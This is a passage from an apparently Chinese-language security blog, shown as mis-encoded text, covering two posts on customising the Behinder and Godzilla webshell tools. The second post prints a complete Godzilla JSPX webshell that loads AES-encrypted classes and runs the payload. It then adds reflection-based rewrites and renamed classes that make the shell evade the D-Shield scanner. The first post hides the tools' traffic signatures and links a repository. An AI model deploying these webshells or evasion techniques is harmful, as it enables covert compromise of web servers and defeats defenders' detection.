çš„ï¼Œ</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702025359673-17513960398604.png" alt="image-20250702025359673"></p><p>ç¬”è€…åœ¨æµ‹è¯•çš„æ—¶å€™ä¼¼ä¹æ²¡å‘ç°è¿™ä¸ªç‰¹å¾ï¼Œè¿™é‡Œä¸å¤ªæ¸…æ¥šæ˜¯å› ä¸ºæœ¨é©¬æ˜¯3.0çš„åŸå› è¿˜æ˜¯å•¥ï¼Œè¿™é‡Œå°±ä¸è¿‡å¤šç ”ç©¶äº†ï¼Œç­‰ä¸‹ä¸ªæ–‡ç« ç ”ç©¶4.0æœ¨é©¬çš„æ—¶å€™ï¼Œæˆ‘ä»¬å†æ¥ç ”ç©¶æ˜¯å¦æœ‰è¿™ä¸ªç‰¹å¾ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¿˜æ˜¯è¦çœ‹ä¸€ä¸‹å†°èçš„æµé‡ï¼Œä»ä»¥å‰å†™çš„æ–‡ç« ä¸­æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨godzillaä¸­</p><p>è¯·æ±‚æµé‡phpæ˜¯å¯ä»¥å·¦å³åŠ å‚æ•°çš„ï¼Œå¦‚ a=s&amp;b=d&amp;pass=balbalï¼Œgodzillaçš„æœ¨é©¬æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯passï¼Œä¸€ä¸ªæ˜¯keyï¼Œpassæ˜¯ç”¨æ¥ä¼ å‚çš„ï¼Œè€Œkeyæ˜¯ç”¨æ¥å¼‚æˆ–çš„ï¼Œæ‰€ä»¥passçš„å€¼æ‰æ˜¯serverç«¯phpæ‰€æ¥å—çš„å‚æ•°ï¼Œè€Œåœ¨Behinderä¸­ï¼Œphpçš„æœ¨é©¬æ˜¯æ˜¯ç”¨çš„<code>file_get_contents(&quot;php://input&quot;);</code>æ¥æ¥å—æ‰€æœ‰çš„ä¼ é€’å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨çœ‹behinderçš„æµé‡æ—¶ï¼Œä¼šå‘ç°ï¼Œæ˜¯æ²¡æœ‰å‚æ•°ä¼ é€’çš„ã€‚è¿™ä¸ªå‡½æ•°file_get_contents(â€œphp://inputâ€)å’Œå­—ç¬¦ä¸²ï¼Œåé¢å…æ€è¦é‡ç‚¹å…³æ³¨ã€‚<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705202555384.png" alt="image-20250705202555384"></p><p>è¿™é‡Œå¦‚æœåœ¨åŠ ä¸€äº› a=s&amp;b=d&amp;pass=balbalï¼Œä¼¼ä¹æœ‰äº›ä¸å¥½ï¼Œä¸æ˜¯é‚£ä¹ˆè§„æ•´äº†ï¼Œè¿™é‡Œå°±ä¸åœ¨ç”»è›‡æ·»è¶³äº†ã€‚å½“ç„¶ï¼Œå¦‚æœæƒ³åŠ çš„è¯ï¼Œä¹Ÿä¸æ˜¯ä¸è¡Œï¼Œ$post=file_get_contents(â€œphp://inputâ€);ï¼Œç›´æ¥è·å–å‚æ•°çš„å€¼ç»™postå˜é‡å³å¯ã€‚<br>ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ï¼Œè¿”å›åŒ…ï¼Œä»ä»¥å‰å†™çš„æ–‡ç« ä¸­æˆ‘ä»¬çŸ¥é“ï¼Œgodzillaçš„è¿”å›åŒ…å¸¦æœ‰å¯†ç å’Œkeyçš„md5å€¼ï¼Œåœ¨è¿”å›åŒ…çš„å‰åï¼Œ</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705203237843-17517187580431.png" alt="image-20250705203237843"></p><p>ä¹Ÿå°±æ˜¯è¿™æ ·çš„ï¼Œ<a href="https://bohemian.top/2024/09/03/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/#php">godzillaäºŒå¼€</a>ï¼Œåœ¨å‰é¢çš„æ–‡ç« ä¸­å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨äºŒå¼€å“¥æ–¯æ‹‰çš„æ—¶å€™ï¼Œç»™ä»–ä¿®æ”¹äº†ä¸€ä¸‹ï¼Œè®©ä»–æ²¡é‚£ä¹ˆæ˜æ˜¾ï¼Œ<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705203447624.png" alt="image-20250705203447624"></p><p>ä¹Ÿå°±æ˜¯è¿™æ ·ï¼Œè®©ä»–æ²¡é‚£ä¹ˆæ˜æ˜¾ï¼Œä½†æ˜¯æˆ‘ä»¬å›è¿‡å¤´æ¥çœ‹behinderçš„è¿”å›åŒ…</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705203604434.png" alt="image-20250705203604434"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705204058620.png" alt="image-20250705204058620"></p><p>çœ‹èµ·æ¥ä¼¼ä¹å°±æ˜¯åŠ å¯†çš„æµé‡ï¼Œå¦‚æœä¸è§£å¯†å‡ºæ¥çš„è¯ï¼Œæ²¡æœ‰ä»€ä¹ˆæ˜æ˜¾çš„ç‰¹å¾ï¼Œå¦‚æœè¿™é‡ŒåŠ æˆé‚£ç§å¸¦messageçš„å…¶å®ä¹Ÿè¡Œï¼Œä½†æ˜¯æ„Ÿè§‰æ²¡ä»€ä¹ˆå¿…è¦ï¼ŒåŠ äº†æœ‰ç‚¹çªå…€ï¼Œè¿™é‡Œç¬”è€…å°±å…ˆä¸åŠ äº†ã€‚å½“ç„¶å¦‚æœä½ æƒ³åŠ ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œåœ¨net/rebeyond/behinder/core/ShellService.javaä¸­ï¼Œå¯¹dataæ•°æ®è¿›è¡Œæ“ä½œå°±å¯ä»¥äº†ï¼Œå½“ç„¶å‰ææ˜¯ä½ çš„æœ¨é©¬ä¹Ÿè¦ä¿®æ”¹ï¼Œå°±æ˜¯echoä¸€ä¸‹ã€‚</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705204158159.png" alt="image-20250705204158159"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705204316386.png" alt="image-20250705204316386"></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæ•´ä½“ä¸Šæ¥çœ‹behinder3.0çš„æµé‡çœ‹èµ·æ¥è¿˜æ˜¯æŒºæ­£å¸¸çš„ã€‚ç›®å‰æ¥çœ‹ä¸å¤ªéœ€è¦è¿›è¡Œæ›´æ”¹ã€‚</p><h5 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>è¿™é‡Œä¹Ÿåªæ˜¯ç®€å•çš„å¯¹å†°è3.0çš„æ•°æ®åŒ…æµé‡è¿›è¡Œä¸€ä¸¢ä¸¢çš„ä¿®æ”¹ï¼Œçœ‹åˆ°ç½‘ä¸Šçš„ä¸€äº›ç‰¹å¾åšéšå»å¤„ç†ï¼Œæ²¡æœ‰åšè¿‡å¤šçš„æ›´æ”¹</p><h5 id="ä¸‹ä¸ªç‰ˆæœ¬"><a href="#ä¸‹ä¸ªç‰ˆæœ¬" class="headerlink" title="ä¸‹ä¸ªç‰ˆæœ¬"></a>ä¸‹ä¸ªç‰ˆæœ¬</h5><p>ä¸‹ä¸ªç‰ˆæœ¬æˆ‘ä»¬å°†åšå…æ€ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“ï¼Œå“¥æ–¯æ‹‰æ˜¯å¯ä»¥ç›´æ¥ç”Ÿæˆæœ¨é©¬çš„ï¼Œè€Œå†°èä¸èƒ½ç›´æ¥ç”Ÿæˆï¼Œæ˜¯è‡ªå¸¦çš„åœ¨ï¼Œåœ¨æˆ‘ä»¬ä¸‹è½½çš„æ—¶å€™ï¼Œ<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705231938998.png" alt="image-20250705231938998"></p><p>åœ¨serverä¸­ï¼Œè¿™æ ·çš„è¯ï¼Œä¸æ˜¯å¾ˆæ–¹ä¾¿ã€‚</p><p>ä¸‹ä¸ªç‰ˆæœ¬å°†æ–°å¢ä¸€ä¸ªå…æ€ç”ŸæˆæŒ‰é’®ï¼Œ</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705232010941.png" alt="image-20250705232010941"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705232203175.png" alt="image-20250705232203175"></p><p>ç‚¹å¼€åï¼Œè¾“å…¥å¯†ç ç”Ÿæˆå³å¯ã€‚</p><p>ç›®å‰æ¡†æ¶å·²å†™å¥½äº†ï¼Œphpå’Œaspå·²ç»åšå®Œå…æ€äº†ï¼Œå…¶ä»–çš„è¿˜éœ€è¦åšä¸€äº›ã€‚å¾ˆå¿«å°†ä¼šå®Œæˆã€‚</p><h5 id="ä¸‹è½½ã€ä½¿ç”¨"><a href="#ä¸‹è½½ã€ä½¿ç”¨" class="headerlink" title="ä¸‹è½½ã€ä½¿ç”¨"></a>ä¸‹è½½ã€ä½¿ç”¨</h5><p>ä»€ä¹ˆï¼Œä½ è¯´çœ‹ä¸æ˜ç™½ã€ä¸æƒ³åŠ¨æ‰‹ã€å¤ªéº»çƒ¦ï¼Œæ²¡äº‹ï¼Œå»ä¸‹è½½å°±å¯ä»¥äº†ã€‚<br><a href="https://github.com/Bohemiana/behinder_erkai">https://github.com/Bohemiana/behinder_erkai</a><br>srcä»£ç ä¹Ÿä»¥ä¸Šä¼ ï¼Œå…æ€å·²æœ‰æ¡†æ¶ä»£ç ï¼Œå¤§å®¶ç›´æ¥ä¸‹è½½ç ”ç©¶å³å¯ã€‚</p><h5 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h5><p>æœ€åæ„Ÿè°¢æ‚¨è¯»åˆ°ç°åœ¨ï¼Œè¿™ç¯‡æ–‡ç« åŒ†å¿™æ„æˆè‚¯å®šæœ‰ä¸å‘¨åˆ°æˆ–æè¿°ä¸æ­£ç¡®çš„åœ°æ–¹ï¼ŒæœŸå¾…ä¸šç•Œå¸ˆå‚…ä»¬ç”¨å„ç§æ–¹å¼æŒ‡æ­£å‹˜è¯¯ã€‚å¦‚æœæ‚¨æ„Ÿè§‰æ–‡ç« å†™çš„ä¸é”™æˆ–è€…å·¥å…·ç”¨èµ·æ¥è¿˜è¡Œï¼Œå¸®ç¬”è€…ç‚¹ç‚¹starsã€ç»™å…¬ä¼—å·ç‚¹ç‚¹å…³æ³¨ï¼Œå…ˆè°¢è°¢å¤§å®¶äº†ã€‚</p><h5 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rebeyond/Behinder            åŸç‰ˆbehinder</span><br></pre></td></tr></table></figure><blockquote><p>emmm å¤ªèœäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> äºŒå¼€ </tag>
            
            <tag> behinder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å“¥æ–¯æ‹‰äºŒå¼€ä»0åˆ°1-6(jspxå…æ€)</title>
      <link href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/"/>
      <url>/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/</url>
      
        <content type="html"><![CDATA[<h5 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h5><p>ä¸Šé¢çš„æ–‡ç« åšäº†åŠ¨æ€çš„å…æ€ï¼Œä»¥åŠåŸºäºæ—¶é—´çš„å¯†é’¥åŠ¨æ€å¤„ç†ï¼Œè®¡åˆ’ä¸­åšä¸€ä¸‹å…¶ä»–è¯­è¨€çš„å…æ€åŠæµé‡ä¿®æ”¹ï¼Œæœ¬ç¯‡æ–‡ç« åšä¸€ä¸‹jspxæµé‡ä¿®æ”¹åŠå…æ€ã€‚</p><h5 id="jspxç®€ä»‹"><a href="#jspxç®€ä»‹" class="headerlink" title="jspxç®€ä»‹"></a>jspxç®€ä»‹</h5><p><strong>JSPX (JavaServer Pages XML)</strong> æ˜¯ä¸€ç§åŸºäº XML è¯­æ³•çš„ JSPï¼ˆJavaServer Pagesï¼‰æ ¼å¼ã€‚å®ƒå°† JSP ä¸ XML çš„ä¸¥æ ¼è¯­æ³•è§„åˆ™ç»“åˆï¼Œç¡®ä¿é¡µé¢ä¸­çš„æ‰€æœ‰æ ‡ç­¾éƒ½ç¬¦åˆ XML çš„ç»“æ„è¦æ±‚ã€‚é€šè¿‡ä½¿ç”¨ JSPXï¼Œå¼€å‘äººå‘˜å¯ä»¥å¾—åˆ°ä¸€ä¸ªç¬¦åˆ XML è§„èŒƒçš„é¡µé¢ï¼Œè¿™åœ¨æŸäº›æƒ…å†µä¸‹éå¸¸é‡è¦ï¼Œä¾‹å¦‚å¤„ç† XML æ•°æ®æˆ–éœ€è¦ä¸å…¶ä»– XML ç³»ç»Ÿè¿›è¡Œé›†æˆæ—¶ã€‚JSPX å°±æ˜¯ JSP çš„ XML ç‰ˆæœ¬ï¼Œä¸»è¦åŒºåˆ«åœ¨äº XML çš„ä¸¥æ ¼è¯­æ³•è¦æ±‚ã€‚</p><p>çœ‹èµ·æ¥æ˜¯aspxå’Œasmxçš„å…³ç³»å·®ä¸å¤šã€‚å°±æ˜¯XMLç‰ˆæœ¬çš„ã€‚</p><h5 id="jspxå…æ€"><a href="#jspxå…æ€" class="headerlink" title="jspxå…æ€"></a>jspxå…æ€</h5><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹Godzillaçš„jspxç”ŸæˆåŸç‰ˆæœ¨é©¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:root xmlns:jsp=<span class="string">&quot;http://java.sun.com/JSP/Page&quot;</span> version=<span class="string">&quot;1.2&quot;</span>&gt;&lt;jsp:declaration&gt; String xc=<span class="string">&quot;3c6e0b8a9c15224a&quot;</span>; String pass=<span class="string">&quot;pass&quot;</span>; String md5=md5(pass+xc); <span class="class"><span class="keyword">class</span> <span class="title">X</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;<span class="function"><span class="keyword">public</span> <span class="title">X</span><span class="params">(ClassLoader z)</span></span>&#123;<span class="keyword">super</span>(z);&#125;<span class="function"><span class="keyword">public</span> Class <span class="title">Q</span><span class="params">(<span class="keyword">byte</span>[] cb)</span></span>&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(cb, <span class="number">0</span>, cb.length);&#125; &#125;<span class="keyword">public</span> <span class="keyword">byte</span>[] x(<span class="keyword">byte</span>[] s,<span class="keyword">boolean</span> m)&#123; <span class="keyword">try</span>&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);c.init(m?<span class="number">1</span>:<span class="number">2</span>,<span class="keyword">new</span> javax.crypto.spec.SecretKeySpec(xc.getBytes(),<span class="string">&quot;AES&quot;</span>));<span class="keyword">return</span> c.doFinal(s); &#125;<span class="keyword">catch</span> (Exception e)&#123;<span class="keyword">return</span> <span class="keyword">null</span>; &#125;&#125; <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">md5</span><span class="params">(String s)</span> </span>&#123;String ret = <span class="keyword">null</span>;<span class="keyword">try</span> &#123;java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);m.update(s.getBytes(), <span class="number">0</span>, s.length());ret = <span class="keyword">new</span> java.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();&#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;<span class="keyword">return</span> ret; &#125; <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">base64Encode</span><span class="params">(<span class="keyword">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception </span>&#123;Class base64;String value = <span class="keyword">null</span>;<span class="keyword">try</span> &#123;base64=Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);Object Encoder = base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, <span class="keyword">null</span>).invoke(base64, <span class="keyword">null</span>);value = (String)Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">new</span> Class[] &#123; <span class="keyword">byte</span>[].class &#125;).invoke(Encoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="keyword">try</span> &#123; base64=Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="keyword">new</span> Class[] &#123; <span class="keyword">byte</span>[].class &#125;).invoke(Encoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e2) &#123;&#125;&#125;<span class="keyword">return</span> value; &#125; <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] base64Decode(String bs) <span class="keyword">throws</span> Exception &#123;Class base64;<span class="keyword">byte</span>[] value = <span class="keyword">null</span>;<span class="keyword">try</span> &#123;base64=Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);Object decoder = base64.getMethod(<span class="string">&quot;getDecoder&quot;</span>, <span class="keyword">null</span>).invoke(base64, <span class="keyword">null</span>);value = (<span class="keyword">byte</span>[])decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;).invoke(decoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="keyword">try</span> &#123; base64=Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>); Object decoder = base64.newInstance(); value = (<span class="keyword">byte</span>[])decoder.getClass().getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;).invoke(decoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e2) &#123;&#125;&#125;<span class="keyword">return</span> value; &#125;&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;<span class="keyword">try</span>&#123;<span class="keyword">byte</span>[] data=base64Decode(request.getParameter(pass));data=x(data, <span class="keyword">false</span>);<span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;payload&quot;</span>)==<span class="keyword">null</span>)&#123;session.setAttribute(<span class="string">&quot;payload&quot;</span>,<span class="keyword">new</span> X(<span class="keyword">this</span>.getClass().getClassLoader()).Q(data));&#125;<span class="keyword">else</span>&#123;request.setAttribute(<span class="string">&quot;parameters&quot;</span>,data);java.io.ByteArrayOutputStream arrOut=<span class="keyword">new</span> java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(<span class="string">&quot;payload&quot;</span>)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(<span class="number">0</span>,<span class="number">16</span>));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), <span class="keyword">true</span>)));response.getWriter().write(md5.substring(<span class="number">16</span>));&#125; &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯éå¸¸çš„é•¿ï¼Œå…¶ä¸­éå¸¸é•¿çš„å°±æ˜¯base64çš„ç¼–è§£ç ï¼Œåšäº†å¾ˆå¤šåˆ¤æ–­ã€‚</p><p>ç®€å•çœ‹ä¸‹ä»£ç ä¼šå‘ç°å…¶å®å’Œjspä»£ç å¤§å·®ä¸å·®ã€‚å‡ ä¹ä¸€æ ·ï¼Œé™¤äº†æ ¼å¼æœ‰ç‚¹åå·®ï¼Œé‚£ä¹ˆæˆ‘ä»¬åšå…æ€å°±å¯ä»¥ç…§ç€ä»¥å‰å†™çš„æ–‡ç« å»ä¿®æ”¹äº†ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250206152005143.png" alt="image-20250206152005143"></p><p>ä½¿ç”¨åŸç‰ˆçš„godzillaä¸­ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼ŒåŠ å¯†å™¨å¹¶æœ‰jspxçš„ï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨javaçš„å°±è¡Œï¼Œç”¨èµ·æ¥ä¸€æ ·ã€‚</p><p>ç®€å•å…ˆç”¨dç›¾fuzzä¸€ä¸‹ï¼Œè¿˜æ˜¯å‘ç°aesåŠ å¯†å¤„åšäº†æ£€æµ‹ï¼Œ</p><p><code>javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(&quot;AES&quot;);            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), &quot;AES&quot;));            return c.doFinal(s);</code></p><p>å°±æ˜¯è¿™ä¸€å¥ï¼Œæˆ‘ä»¬å¯¹è¿™ä¸ªè¿›è¡Œç®€å•ä¿®æ”¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String xo = &quot;javax.crypto.Cipher&quot;;</span><br><span class="line">        Class cl = Class.forName(xo);</span><br><span class="line">        java.lang.reflect.Method g = cl.getMethod(&quot;getInstance&quot;,String.class);</span><br><span class="line">        Object c = cl.cast(g.invoke((null),&quot;AES&quot;));</span><br><span class="line">        cl.getMethod(&quot;init&quot;,int.class,java.security.Key.class).invoke(c,m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), &quot;AES&quot;));</span><br><span class="line">         java.lang.reflect.Method douyin = cl.getMethod(&quot;doFinal&quot;, byte[].class);</span><br><span class="line">        return (byte[]) douyin.invoke(c, (Object) s);</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250206151832748.png" alt="image-20250206151832748"></p><p>å½“ç„¶ï¼Œè¿™ä¸ªæ—¶å€™è¿˜æ˜¯æœ‰é—®é¢˜çš„ï¼Œå°±æ˜¯åŠ è½½base64ç¼–è§£ç é‚£é‡Œã€‚æ–‡ç« 3å…æ€çš„æ—¶å€™å·²ç»æåˆ°è¿‡äº†ï¼Œç¬”è€…è¿™é‡Œç›´æ¥æŠŠjspçš„æ‹¿è¿‡æ¥ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> <span class="built_in">String</span> base64Encode(byte[] webray) throws Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.util.Base64.Encoder leadsec = java.util.Base64.getEncoder();</span><br><span class="line">            <span class="keyword">return</span> leadsec.encodeToString(webray);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">public <span class="keyword">static</span> byte[] base64Decode(<span class="built_in">String</span> bs) throws Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.util.Base64.Decoder nsfocus = java.util.Base64.getDecoder();</span><br><span class="line">            <span class="keyword">return</span> nsfocus.decode(bs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">    &#125;<span class="class"><span class="keyword">class</span> <span class="title">huawei</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">        public <span class="function"><span class="title">huawei</span>(<span class="params">ClassLoader sina</span>)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(sina);</span><br><span class="line">        &#125;</span><br><span class="line">       public Class <span class="function"><span class="title">Q</span>(<span class="params">byte[] bytedance</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(<span class="literal">null</span>, bytedance, <span class="number">0</span>, bytedance.length);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯ç”¨äºè·å–å½“å‰ç±»çš„ç±»åŠ è½½å™¨<code>this.getClass().getClassLoader()</code>è¿™ä¸ªè¯­å¥dç›¾ä¹Ÿæ€ï¼Œæˆ‘ä»¬ç»™ä»–æ¢æ‰<code>ClassLoader.getSystemClassLoader()</code>è¿™æ ·å°±é™çº§äº†</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250206154642813.png" alt="image-20250206154642813"></p><p>2çº§ï¼Œç»è¿‡ç¬”è€…åœ¨fuzzï¼Œ<code>Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();f.equals(arrOut);f.equals(pageContext);</code></p><p>é—®é¢˜å‡ºç°åœ¨.newInstance();</p><p>ä½†æ˜¯åœ¨å“¥æ–¯æ‹‰äºŒå¼€ä»0åˆ°1-2å…æ€çš„æ–‡ç« ä¸­ï¼Œç¬”è€…æµ‹è¯•çš„jspå…æ€ï¼Œå¹¶æ²¡æœ‰å¯¹è¿™ä¸€ç‚¹è¿›è¡ŒæŸ¥æ€ã€‚æ‰€ä»¥è‚¯å®šè¿˜æ˜¯å“ªé‡Œæœ‰é—®é¢˜å‡ºç°åœ¨ä¸‹é¢æœ€åä¸€æ®µé‡Œã€‚å› ä¸ºjspå’Œjspxçš„æœ¨é©¬éƒ½å·®ä¸å¤šï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:scriptlet&gt;try&#123;byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(&quot;payload&quot;)==null)&#123;session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(&quot;parameters&quot;,data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));&#125; &#125;catch (Exception e)&#123;&#125;</span><br><span class="line">&lt;/jsp:scriptlet&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ.newInstance();å¦‚æœæ²¡é—®é¢˜ï¼Œå¤§æ¦‚ç‡æ˜¯<code>&lt;jsp:scriptlet&gt;</code>è¿™ç§å£°æ˜æœ‰é—®é¢˜äº†ã€‚</p><p>å‚è€ƒå¤§å¸ˆå‚…æ–‡ç« <a href="https://yzddmr6.com/posts/jsp-webshell-upload-bypass/">https://yzddmr6.com/posts/jsp-webshell-upload-bypass/</a> å¯ä»¥å‘ç°ï¼Œå…¶ä¸­<a href="jsp:scriptlet">jsp:scriptlet</a>å¯ä»¥å°†jspæ¢æ‰çš„ã€‚æ¢æˆä»»æ„å­—ç¬¦éƒ½å¯ä»¥ã€‚è¿™é‡Œä¹Ÿå¯ä»¥æ€€ç–‘æ˜¯dç›¾æ£€æµ‹äº†jspå­—ç¬¦ä¸²ï¼Œç¡®å®æŒºå¯ç–‘çš„ã€‚</p><p><img 